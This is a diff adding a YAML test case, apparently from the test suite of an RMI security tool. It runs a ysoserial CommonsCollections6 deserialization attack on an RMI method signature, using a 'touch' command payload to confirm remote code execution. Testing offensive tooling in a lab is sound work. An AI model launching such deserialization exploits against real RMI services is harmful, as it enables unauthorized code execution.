@@ -1,0 +1,61 @@
+tester:
+  title: Serial Tests
+  description: |-
+    'Perform tests for the serial action on custom RMI endpoints.'
+
+  id: '002-009'
+  groups:
+    - plugin
+    - serial
+  id_pattern: '002-009-{:03}'
+
+
+variables:
+  file: jdk9-method-rce-test.txt
+
+
+plugins:
+  - os_command:
+      cmd:
+        - /bin/bash
+        - ../../../plugins/build.sh
+        - ../../../target/${rmg}
+        - ../../utils/PluginTest.java
+        - ../../utils/PluginTest.jar
+
+
+tests:
+  - title: String Marshaling
+    description: |-
+        'Attempts a deserialization attack on String execute(String dummy), which'
+        'should work since jdk9 was never patched (String unmarshalled via readObject).'
+
+    groups:
+      - ysoserial
+
+    command:
+      - rmg
+      - serial
+      - ${TARGET}
+      - CommonsCollections6
+      - 'touch ${volume-d}/${file}'
+      - --signature
+      - 'String execute(String dummy)'
+      - --bound-name
+      - plain-server
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - deserialize canary class
+            - probably worked
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${file}'
+
+
+include:
+  - ../../shared/serial.yml
